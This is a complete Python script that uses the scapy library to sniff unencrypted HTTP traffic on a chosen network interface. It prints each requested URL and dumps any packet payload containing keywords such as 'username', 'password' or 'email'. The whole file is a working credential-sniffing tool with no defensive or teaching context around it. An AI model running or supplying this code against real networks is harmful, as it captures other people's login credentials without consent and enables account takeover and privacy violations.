#!/use/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface whose packet flow is to be sniffed")
    option = parser.parse_args()
    if not option.interface:
        print("[-] Please specify a interface, use --help for more info")
        return

    return option


def sniff(interface):
    print("\n[+] Waiting for the data to flow...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "user", "login", "password", "pass", "E-mail", "E-Mail", "Email",
                    "Password", "Pass", "Login", "User", "Username", "Uname"]
        for keyword in keywords:
            keyword = bytes(keyword, encoding='utf-8')
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n")
            print(login_info)
            print("\n")


option = get_arguments()
if not option:
    exit()

try:
    sniff(option.interface)

except OSError:
    print("[-] No interface found with name " + option.interface)
